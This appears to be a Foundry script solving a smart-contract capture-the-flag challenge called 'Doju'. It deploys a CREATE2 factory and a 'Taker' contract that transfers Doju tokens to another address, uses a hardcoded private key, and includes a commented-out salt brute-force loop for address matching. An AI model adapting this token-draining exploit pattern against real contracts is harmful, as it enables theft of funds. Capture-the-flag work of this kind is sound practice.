// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "src/Challenge.sol";

contract SolutionDeployer {

    function deploy(bytes memory bytecode, bytes32 salt) public returns (address) { 
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        require(addr != address(0), "Deploy failed");
        return addr;
    }

}

contract Taker {
    Doju doju = Doju(payable(0xC47fcC04762b188c3C5D1D01aBb279e21be4d6E9));

    function withdraw(uint256 amount) public {
        doju.transfer(address(0xc0ffee), amount);
    }
}

contract Solution is Script {

    function run() public {
        uint256 mask = uint256(0xffffffff);
        uint256 privateKey = 0x9ab0fe65575aa17213ff8d6ac83462d3932849aeb42ca70b0cb3e85d24feb7d9;
        
        
        console.log("addr : ", vm.addr(privateKey));

        Challenge challenge = Challenge(0x21474f7350Ea47e17229ed1a27B43D17992A8777);

        console.log("dojo", address(challenge.doju()));
        address doju = address(challenge.doju());
        uint i = 0;
        
        console.logBytes(type(Taker).creationCode);
        vm.startBroadcast(privateKey);


        SolutionDeployer deployer = new SolutionDeployer();
        console.log("deployer : ", address(deployer));
        
        vm.stopBroadcast();
        // while (true) {

        //     Taker taker = new Taker{salt: bytes32(i)}(challenge.doju());

        //     if(uint256(uint160(address(taker))) & mask == uint256(uint160(doju)) >> 128) {  
        //         console.log("salt : ", i);
        //         break;
        //     }          
        //     i++;
        // }
    }
}